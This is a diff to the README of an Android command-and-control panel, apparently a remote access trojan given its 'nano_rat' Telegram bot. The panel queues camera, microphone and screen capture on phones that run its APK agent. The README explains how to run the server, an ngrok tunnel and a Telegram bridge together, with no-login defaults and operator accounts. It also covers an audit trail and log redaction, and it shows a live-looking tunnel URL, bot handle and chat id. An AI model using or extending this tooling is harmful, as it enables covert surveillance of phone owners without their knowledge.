@@ -29,17 +29,61 @@ tests/                 pytest suite (90 tests)
 python3 -m venv .venv && source .venv/bin/activate
 pip install -r requirements.txt
 
-cp .env.example .env          # then edit it
-python3 app.py
+cp .env.example .env          # edit as needed
+./run.sh                      # or just: python3 app.py
 ```
 
-Open `http://127.0.0.1:5000` and log in. If you did not set
-`C2_OPERATOR_PASSWORD`, the password is printed in the startup banner and
-persisted at `data/c2_operator_password.secret`.
+Open `http://127.0.0.1:5000`. **No login, no password** in the default mode.
 
-The server binds **loopback by default**. Expose it through a tunnel you
-control rather than setting `C2_HOST=0.0.0.0` on a machine with a routable
-address.
+```bash
+./run.sh              # server + tunnel + bridge, supervised
+./run.sh --no-tunnel  # local only
+./run.sh --no-bridge  # server only
+./run.sh --check      # verify .env and exit
+```
+
+One command, three processes, in order, each health-checked before the next
+starts. Ctrl-C stops all three. Everything comes from `.env` — there is
+nothing to type at a prompt.
+
+```
+==> ready
+    panel      http://127.0.0.1:5000  (local)
+    tunnel     https://backdrop-embassy-anymore.ngrok-free.dev
+    agent URL  https://backdrop-embassy-anymore.ngrok-free.dev
+    agent key  ffc8c5c0  (must match the APK)
+    telegram   @nano_rat_ui_bot, chat 788903767
+    logs       logs/server.log  logs/bridge.log  logs/ngrok.log
+```
+
+`--check` validates the bot token against Telegram and prints the agent key
+fingerprint, so a mismatch shows up before you install anything.
+
+### Access modes
+
+`C2_AUTH` picks one:
+
+| mode | behaviour |
+|---|---|
+| `open` (default) | nothing required. Correct only while bound to loopback |
+| `token` | loopback open; remote requests need `C2_ACCESS_TOKEN` |
+| `operator` | named accounts with passwords (`flask --app app operators`) |
+
+The loopback carve-out exists because the panel queues commands that capture
+camera, microphone and screen on the phone. Over ngrok that URL is public, so
+put it in `token` mode before exposing it:
+
+```bash
+C2_AUTH=token
+C2_ACCESS_TOKEN=$(python3 -c "import secrets;print(secrets.token_urlsafe(16))")
+C2_TRUSTED_PROXY=127.0.0.1      # so X-Forwarded-For is believed
+```
+
+Then open `https://your-tunnel/?k=<token>` once and the panel keeps it. This
+is the same one-value idea as `C2_API_KEY`, not a login system.
+
+Without `C2_TRUSTED_PROXY`, tunnel requests arrive looking like loopback and
+the carve-out cannot work — the server logs `auth.proxy_untrusted` at startup.
 
 ### Secrets
 
@@ -186,6 +230,175 @@ end-to-end run of the bridge against a booted server.
 - `cors_allowed_origins` is left at the default. With `*`, any page the
   operator visited could open a socket to the panel and read everything.
 - Deleting a device deletes its commands *and* its files from disk.
+
+## Operators
+
+The panel has named operators, not one shared password. That is what makes the
+audit trail below an accountability record rather than a log.
+
+```bash
+flask --app app operators                    # list
+flask --app app operators add kanha          # create; prints the token once
+flask --app app operators passwd kanha       # new password
+flask --app app operators token kanha        # rotate the API token
+flask --app app operators revoke kanha       # drop the token
+flask --app app operators disable kanha      # block access, keep the history
+flask --app app operators enable kanha
+flask --app app operators rm kanha           # delete the row, keep the history
+```
+
+Passwords are read from `C2_NEW_PASSWORD` or prompted for, never from a
+command-line default, so they stay out of shell history. Minimum 12 characters.
+
+The first operator is bootstrapped from `C2_OPERATOR_NAME` /
+`C2_OPERATOR_PASSWORD` **while the operator table is empty**. Once any operator
+exists those variables are ignored — changing them does not alter a live
+account, so use the CLI.
+
+### Credential storage
+
+| | stored as | why |
+|---|---|---|
+| password | werkzeug scrypt hash, per-row salt | never recoverable, never comparable across rows |
+| API token | sha256 digest, indexed | one indexed lookup instead of a scan; a database leak does not hand over usable tokens |
+
+The plaintext token is shown exactly once, at creation or rotation.
+
+### Token auth for machine clients
+
+```bash
+curl -H "Authorization: Bearer $TOKEN" localhost:5000/api/operators/me
+curl -H "Authorization: Bearer $TOKEN" localhost:5000/api/devices
+```
+
+The Telegram bridge prefers this over a password:
+
+```bash
+C2_OPERATOR_TOKEN=...   # set this; C2_OPERATOR_PASSWORD is not needed
+```
+
+Tokens are resolved per request rather than cached in a session, so rotating or
+revoking one takes effect immediately — the old token stops working on the next
+call.
+
+CSRF is **not** required for token callers. A cookie is an ambient credential:
+a cross-site form can make the browser attach it, which is what CSRF defends
+against. A bearer token is never attached automatically, so a cross-site
+request cannot forge one. Cookie sessions still require `X-CSRF-Token`.
+
+No header can claim an identity: `X-Operator-Name`, `X-User` and friends are
+ignored. Identity comes from the session or from a token that resolves to a
+row.
+
+### Login throttling
+
+Two buckets with different budgets:
+
+| bucket | budget | what it stops |
+|---|---|---|
+| operator name | 5 | a targeted attack on one known account, from anywhere |
+| source IP | 25 | a spray across many names from one host |
+
+Name-only throttling would let one attacker lock a known account from the
+whole internet; IP-only would let one person mistyping their password five
+times lock out everyone behind the same address.
+
+## Operator audit trail
+
+Every mutating operator action is written to `operator_actions` before the
+response goes out — command queueing (including refusals), device deletion,
+notes and tags, file uploads and reads, and all login outcomes.
+
+```bash
+curl -s localhost:5000/api/audit?limit=20          # newest first
+curl -s localhost:5000/api/audit?action=command.queue
+curl -s localhost:5000/api/audit?outcome=denied
+curl -s localhost:5000/api/audit/verify            # recompute the chain
+```
+
+The route is **GET-only**: no verb can mutate or delete a row, and
+`OperatorAction` deliberately exposes no update helper. Each row also carries
+a digest computed with `SECRET_KEY` over its own content *and the digest of
+the row before it*, so editing or deleting an earlier entry invalidates
+everything after it — `/api/audit/verify` reports the first id where the
+chain stops agreeing with itself.
+
+`actor` is the operator name from the session or the token, so the trail
+separates people and machine clients:
+
+```
+kanha        device.notes     16 chars
+bridge-bot   device.notes     14 chars
+```
+
+Both rows came from `device.notes`; the names say who acted.
+
+Nothing is pruned automatically. `audit.prune(days)` exists but has to be
+called on purpose — silent deletion of an audit trail is worse than a full
+disk.
+
+## Logging
+
+Two formats, one switch:
+
+```bash
+C2_LOG_FORMAT=text   # human readable, key=value, greppable
+C2_LOG_FORMAT=json   # one object per line, for journald/Loki/ELK
+C2_LOG_LEVEL=info
+```
+
+Every line carries a request id when one is in scope, so a single request's
+log can be pulled out with one filter:
+
+```
+22:10:53.729 INFO c2.http http.request method=POST path=/api/device/12/command status=200 ms=39 ip=127.0.0.1 rid=4f6a1c32858587c6
+```
+
+```
+{"ts":"...","level":"info","logger":"c2.http","event":"http.request","rid":"37d187eecf6a091c",
+ "method":"POST","path":"/api/device/12/command","status":200,"ms":41,"ip":"127.0.0.1"}
+```
+
+The id is echoed in the `X-Request-ID` response header. A client-supplied id is
+**ignored** unless `C2_TRUST_PROXY_REQUEST_ID` is set, so a browser cannot
+choose its own correlation id; enable it only behind a proxy you control.
+
+### Redaction
+
+Secret redaction happens in the formatter, not at each call site:
+
+- a field whose *name* looks like a credential (`password`, `api_key`,
+  `token`, `authorization`, …) is masked
+- any *value* containing a registered secret is masked, whatever the field is
+  called — so a secret passed as `value` is still caught
+
+Derived metadata is exempt from the name rule only: `api_key_fp`,
+`api_key_len`, `secret_count` survive, because a fingerprint is what makes a
+key mismatch diagnosable. Value-level redaction still applies to them.
+
+`SECRET_KEY`, `API_KEY` and `OPERATOR_PASSWORD` are registered at startup, so
+none of them can appear in the log even if a future field name slips past the
+pattern.
+
+### What is logged
+
+| Logger | Events |
+|---|---|
+| `c2.startup` | `server.starting` (config summary, fingerprints only) |
+| `c2.http` | `http.request` (method, path, status, ms, ip, rid) |
+| `c2.app` | `uploads.migrated`, `http.unhandled` |
+| `c2.agent` | `agent.accepted`, `agent.rejected`, `agent.disconnected` |
+| `c2.reaper` | `device.stale`, `reaper.error` |
+| `c2.db` | `schema.column_added` |
+
+`werkzeug` is silenced: it logs a spurious 500 for every WebSocket that
+closes, which drowns out everything useful. gunicorn's access log is off for
+the same reason.
+
+```bash
+journalctl -u androidc2 -f | grep 'rid=4f6a1c32'
+journalctl -u androidc2 -f | grep agent.rejected
+```
 
 ## Database
 
